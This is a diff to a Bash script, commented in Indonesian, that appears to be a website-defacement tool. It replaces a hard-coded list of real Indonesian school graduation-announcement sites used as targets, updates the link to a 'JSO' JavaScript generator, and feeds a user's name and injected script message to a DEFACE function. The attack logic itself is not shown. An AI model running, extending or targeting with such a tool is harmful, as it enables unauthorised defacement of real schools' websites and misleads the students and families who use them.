@@ -99,31 +99,21 @@ trap 'ctrl_c SIGTSTP' SIGTSTP
 trap 'ctrl_c SIGTERM' SIGTERM
 # Daftar domain saja
 domains=(
-  "https://kelulusan.mtscieurih.sch.id"
-  "https://asik.man2tanahdatar.sch.id"
-  "https://ceklulus.sman1bku.sch.id"
-  "https://www.ppdb.smkn2kayuagung.sch.id"
-  "https://kelulusan.smkbinapatria1sukoharjo.sch.id"
-  "https://smkn4purworejo.sch.id/lulussmk4"
-  "https://asiksmk.smkyp17jombang.sch.id"
-  "https://kelulusansman7plg.sman7palembang.sch.id"
-  "https://www.smkntanjungsari.sch.id/kelulusan/pengumuman"
-  "https://sman2kalianda.sch.id/kelulusan"
-  "https://kelulusan.smk234adw.sch.id"
-  "https://sman1plemahan.sch.id/pengumuman"
-  "https://smpn211jakarta.sch.id/infokelulusan2024"
-  "https://www.skl.smpn1bojonegoro.sch.id"
-  "https://malidaprofetik.sch.id/kelulusan"
-  "https://lulus.smansakakap.sch.id"
-  "http://www.kelulusan.sman1subang.sch.id"
-  "https://info.labschoolcibubur.sch.id/osissmp"
-  "http://www.lulusan.sman4-pkp.sch.id"
-  "https://www.un2020.smkn3baubau.sch.id"
-  "https://nilai.sman6sby.sch.id"
-  "https://kelulusan.smkn1paringin.sch.id/panel"
-  "https://www.simlus.smkn3bojonegoro.sch.id"
-  "https://www.pengumuman.smkp6jatisrono.sch.id"
-  "https://cekkenaikankelas.sman1sandai.sch.id/"
+"https://lulus.sman1pklkuras.sch.id"
+"www.kelulusan.sman1subang.sch.id"
+"https://www.sman1ambarawalpg.sch.id/asik"
+"https://info.labschoolcibubur.sch.id/osissmp"
+"https://sman1puncu.sch.id/pengumuman"
+"https://smkn4purworejo.sch.id/lulussmk4"
+"https://lulus.smantujuhkabtang.sch.id/"
+"https://pengumuman.smanila.sch.id"
+"https://kelulusan.smkbinapatria1sukoharjo.sch.id"
+"https://nilai.sman6sby.sch.id/"
+"https://sman2kalianda.sch.id/kelulusan"
+"https://www.kelulusan.mtscieurih.sch.id/"
+"https://smknegeri9garut.id/"
+"https://pengumuman.man1kuburaya.sch.id"
+""
 )
 paths=(
   "/index.php?page=contact"
@@ -243,7 +233,7 @@ Premfree() {
      clear
      echo "============HASIL DEFACE==========" > $HASILE_SU_ASU
      baner | lolcat
-     xdg-open "https://jso-tools.z-x.my.id/"
+     xdg-open "https://defacer.id/tools/jso-generator"
      read -p "Masukkan Nama Anda: " apa
      read -p "Masukkan Pesan (Jso): " javascript
      clear
@@ -254,7 +244,7 @@ Premfree() {
      LOADING_PID=$!
      while true; do
           sleep 0.1
-          DEFACE "$apa" "TOOLSV5_VERSION_$versitoolsv5" "$javascript"
+          DEFACE "$apa" "TOOLSV5©2025" "$javascript"
                          if read -t 1 user_input; then
                               if [[ $user_input == "q" ]]; then
                                    ctrl_c
@@ -319,7 +309,7 @@ Premfree() {
      clear
      baner | lolcat
      echo "============HASIL DEFACE==========" > $HASILE_SU_ASU 
-     xdg-open "https://jso-tools.z-x.my.id/"
+     xdg-open "https://defacer.id/tools/jso-generator/"
      read -p "Masukkan Nama Anda: " apa
      read -p "Masukkan Pesan (Jso): " javascript
      clear
@@ -330,7 +320,7 @@ Premfree() {
      loading &
      LOADING_PID=$!
           sleep 0.1
-          DEFACE "$apa" "TOOLSV5_VERSION_$versitoolsv5" "$javascript"
+          DEFACE "$apa" "TOOLSV5©2025" "$javascript"
      kill $LOADING_PID
     if [ -f "$HASILE_SU_ASU" ]; then
           echo -ne "\r${h}Hasil tersimpan di:${res}\n"
